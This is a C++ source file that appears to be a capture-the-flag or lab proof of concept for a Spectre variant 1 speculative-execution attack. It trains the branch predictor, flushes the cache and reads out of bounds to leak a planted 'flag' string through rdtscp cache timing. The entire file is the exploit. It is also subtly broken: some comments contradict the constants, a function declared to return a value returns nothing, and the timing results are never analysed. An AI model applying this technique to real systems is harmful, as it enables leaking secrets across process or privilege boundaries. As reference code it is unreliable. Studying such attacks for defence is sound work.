#include <string>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <x86intrin.h>

#define DEBUG_ON

static const size_t N_TRAINING = 30;
static const size_t N_AVERAGE = 5000;
static const uint64_t BAD_TIME = 5000;
FILE* fp;

static const size_t BYTES_TO_LEAK = 4;
static const size_t MIN_CHAR = 60;//Space
static const size_t MAX_CHAR = 88;// DEL
static const size_t SEQUENCE_SIZE = 256;
static const size_t N_STARS = 256;
static const size_t COMMAND_SIZE = 512;



char StarCatalog[N_STARS][COMMAND_SIZE];
uint8_t CommandSequence[SEQUENCE_SIZE];
uint8_t flag[256]; 
// char flag[] = "HIallotherlettersindisflagarelowercase";


__attribute__ ((aligned (0x10000))) uint16_t G_MaxQueueSize = 0; // MAX_AUTH_ITEMS;


void burn_counts( size_t count )
{
    for ( volatile int z = 0; z < count; z++ )
    {
    }
}

/// @brief Prints the command based on its opcode
/// @param opCode 
void GetCommand( size_t opCode )
{
    if( opCode < N_STARS)
    {   
    char cmd = StarCatalog[opCode][0];
    burn_counts(100);
    //fprintf(fp, "Command with OPCODE %zu is %s\n", opCode, cmd );
    }
    else
    {
        printf("Out of bounds\n");
    }
    
} 


/// @brief Prints a command based on its index in the command sequence
/// @param sequenceIdx which command in the sequest 
/// @return 
char PrintCommand( size_t sequenceIdx ) 
{
    char* out;
    if( sequenceIdx < G_MaxQueueSize )
    {
        // CommandSequence[sequenceIdx] will be the flag if we access it out of bounds
        // the if statement checking agianst SEQUNCE_SIZE should protect us but we can force
        // the value into the L2 cache via speculative exe
        //out = StarCatalog[ CommandSequence[sequenceIdx] ][0];
        out = StarCatalog[ CommandSequence[sequenceIdx] ];
        burn_counts( 100 );
        //fprintf(fp,"Command %zu is: %s\n" , sequenceIdx , out);
    }
    else
    {
        //printf("Out of bounds\n");
    }
}

void Flush()
{
    // evict the possible locations in CommandQueue out of the cache
    // send me before i train the branch prediction unit
    uint32_t i, j;
    _mm_mfence();

    for ( i = 0; i < 256; i++ )
    {
        for ( j = 0; j < 8; j++ )
        {
            _mm_clflush( (uint8_t*)StarCatalog+(i*512)+(j*64) ); 
        }
    }


	_mm_mfence();
}

uint64_t single_attack( size_t nOutOfBounds , char guess )
{
    // Flush
    Flush();// Dafuq?
    // Train the branch predictor
    for( size_t k=0; k< N_TRAINING;k++)
    {
    	// flush out gmax_authitems to allow specex
		_mm_clflush(&G_MaxQueueSize);
        _mm_mfence();

		// "burn" a little to give the cache time to flush
        burn_counts( 100 );
        // Generate a random in bound index 
        uint32_t valid_index;
        valid_index = rand();// no worky?
        valid_index +=((k * 167) + (  (uint8_t)(guess) * 12) + 13);
        valid_index = valid_index % SEQUENCE_SIZE;
        //printf("%d\n",valid_index);
        // and test it
        PrintCommand( valid_index );
    }
    _mm_clflush(&G_MaxQueueSize);
    _mm_mfence();

    burn_counts( 100 );
    // Do an out of bounds read
    size_t targetByteIdx;
    targetByteIdx = SEQUENCE_SIZE + nOutOfBounds;
    PrintCommand( targetByteIdx );
    // Measure access time
    uint64_t start, elapsed;
    uint32_t junk = 0;

    start = __rdtscp( &junk );
    GetCommand( guess );
    //_mm_mfence();

    elapsed = __rdtscp( &junk ) - start;
    return elapsed;
}
uint64_t avg_attack( size_t nOutOfBounds,  char guess, size_t trials )
{
    uint64_t cumulative = 0;
    for( size_t trial =0 ; trial < trials; trial++ )
    {
        uint64_t counts;
        bool retry(true);
        while( true == retry )
        {
            counts = single_attack( nOutOfBounds, guess);
            if( counts > BAD_TIME )
            {
                //printf("Bad counts %d -- retrying \n", counts);
            }
            else
            {
                retry = false;
            }
        }
        
        cumulative += counts;
    }
    return cumulative;
}

void FillCommands()
{
    for( size_t k=0 ; k < N_STARS; k++ )
    {
        char * x = &StarCatalog[k][0];
        snprintf(x ,COMMAND_SIZE, "COMMAND MY INDEX IS %d",k );
    }

    for( size_t k=0; k < SEQUENCE_SIZE; k++ )
    {
        size_t valid_index = rand() % N_STARS;
        CommandSequence[k] = valid_index;

    }
}

int main( void )
{
    G_MaxQueueSize = SEQUENCE_SIZE;

    strcpy( (char *)flag, "HITGallotherlettersindisflagarelowercase" );

#ifdef DEBUG_ON
    printf( "Position of StarCatalog: %016llX\n", CommandSequence );
    printf( "Position of flag: %016llX\n", flag );
#endif

    FillCommands();
    uint64_t Measurements[BYTES_TO_LEAK][MAX_CHAR-MIN_CHAR] ;
    fp = stderr;
    fp = fopen("cmds.txt","wt");
    for( size_t byteNumber = 0 ; byteNumber < BYTES_TO_LEAK ; byteNumber++ )
    {
        printf("Leaking byte %d\n", byteNumber);
        for( uint8_t charNumber=0; charNumber < MAX_CHAR-MIN_CHAR ; charNumber++ )
        {
            
            char guess ;
            uint8_t actual_char = MIN_CHAR + charNumber;
            guess = *reinterpret_cast<char*>( &actual_char);
            printf("Attempting char %c ...", guess);
            uint64_t count;
            
            count = avg_attack( byteNumber , guess, N_AVERAGE);
            printf(" %d\n", count);
            Measurements[byteNumber][charNumber] = count;
        }
    }
    // create a file
    return 0;
}
